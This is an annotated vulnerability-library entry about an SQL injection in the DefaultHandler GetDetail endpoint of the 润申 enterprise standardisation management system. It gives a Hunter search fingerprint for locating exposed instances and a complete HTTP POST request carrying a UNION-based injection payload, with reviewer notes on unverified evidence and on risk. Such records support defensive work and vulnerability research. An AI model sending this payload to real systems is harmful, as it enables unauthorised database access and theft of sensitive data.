---
source: "wy876 漏洞文库"
title: "润申企业标准化管理系统 DefaultHandler GetDetail id SQL 注入"
product: "润申企业标准化管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server固定UNION列数，版本未知"
prerequisites: "无Cookie示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/re7d3yel51oishkq"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B6%A6%E7%94%B3%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B6%A6%E7%94%B3%E4%BC%81%E4%B8%9A%E6%A0%87%E5%87%86%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDefaultHandler%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"PDCA/js/_publicCom.js\""
id: "vw-7b0dc6ec2290fc85c0b9cc09"
entity_id: "ve-7b0dc6ec2290fc85c0b9cc09"
schema_version: "1"
---

# 润申企业标准化管理系统 DefaultHandler GetDetail id SQL 注入

## 条目说明

- 对象与具体问题：润申企业标准化管理系统；DefaultHandler GetDetail id SQLi
- 版本、配置及部署条件：SQL Server固定UNION列数，版本未知
- 认证与权限前提：无Cookie示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 长UNION载荷仍Content-Length32，显著短于正文，不能直接发送；基准长度也需核
- CHAR拼接随机标记但无返回证明，status300/actionGetDetail是业务前提
- 无源码/修复/范围，Hunter元数据错误归FOFA

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
润申企业标准化管理系统DefaultHandler存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 润申企业标准化管理系统

## 三、资产测绘
+ hunter`web.body="PDCA/js/_publicCom.js"`
+ 特征


## 四、漏洞复现
```http
POST /ashx/DefaultHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

action=GetDetail&status=300&id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28111%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28105%29%2BCHAR%28103%29%2BCHAR%28111%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%2869%29%2BCHAR%2887%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+BUHl
```

> 请求长度说明：原资料 Content-Length 为 32；静态长度已移除，应由客户端根据最终请求体的字节数生成。


sqlmap

```http
POST /ashx/DefaultHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

action=GetDetail&status=300&id=1
```

> 请求长度说明：原资料 Content-Length 为 32；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/re7d3yel51oishkq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
